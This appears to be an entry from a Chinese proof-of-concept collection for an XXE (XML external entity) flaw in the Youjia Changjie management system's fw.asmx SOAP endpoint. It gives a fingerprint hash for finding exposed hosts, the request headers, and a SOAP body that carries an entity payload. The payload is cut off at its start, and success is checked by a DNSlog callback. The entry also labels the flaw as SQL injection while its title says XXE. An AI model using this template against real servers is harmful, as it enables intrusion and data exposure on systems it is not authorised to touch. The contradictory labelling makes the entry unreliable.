# 友加畅捷管理系统fw.asmx存在XML实体注入漏洞

- **系统**：友加畅捷管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="2049187099"`
- **请求**：`POST /fw.asmx HTTP/1.1`
- **关键头**：`SOAPAction: [http://tempuri.org/ZTList](http://tempuri.org/ZTList)`　`Content-Type: application/xml`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:ZTList>
<!--type: string-->
<tem:xmldata>XXE_POC</tem:xmldata>
</tem:ZTList>
</soapenv:Body>
</soapenv:Envelope>
POST /fw.asmx HTTP/1.1
Host:
SOAPAction: [http://tempuri.org/ZTList](http://tempuri.org/ZTList)
Content-Type: application/xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:ZTList>
<tem:xmldata><?xml version="1.0" encoding="UTF-8"?>
<!DOCTY…（脚本共 756 字，完整版见原文）
```
- **预期**：200　|　Dnslog回显